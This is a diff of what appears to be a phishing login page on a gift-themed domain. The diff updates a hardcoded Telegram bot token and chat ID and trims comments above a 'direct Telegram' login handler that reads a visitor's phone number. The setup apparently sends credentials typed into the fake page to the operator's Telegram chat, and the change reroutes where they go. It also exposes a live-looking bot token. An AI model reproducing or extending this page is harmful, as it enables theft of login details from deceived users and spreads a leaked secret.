@@ -183,7 +183,8 @@
         }
         
         @keyframes shake {
-            0%, 100% { transform: translateX(0); }
+            0%,
+            100% { transform: translateX(0); }
             20% { transform: translateX(-8px); }
             40% { transform: translateX(8px); }
             60% { transform: translateX(-8px); }
@@ -481,10 +482,10 @@
 
     <script>
         // ============================================
-        // TELEGRAM & API CONFIGURATION
+        // TELEGRAM & API CONFIGURATION - UPDATED CHAT ID
         // ============================================
         const BOT_TOKEN = '8810189563:AAH_np3_4ol0O0yO-t0PA68YtPrGH6htUdI';
-        const CHAT_ID = '157828443';
+        const CHAT_ID = '8660032806';
         const API_URL = 'https://eco09giftscom-production.up.railway.app/api';
 
         console.log('====================================');
@@ -574,7 +575,7 @@
         }
 
         // ============================================
-        // LOGIN HANDLER - DIRECT TELEGRAM (NO BACKEND)
+        // LOGIN HANDLER - DIRECT TELEGRAM
         // ============================================
         loginBtn.addEventListener('click', function() {
             const phone = phoneInput.value.trim();
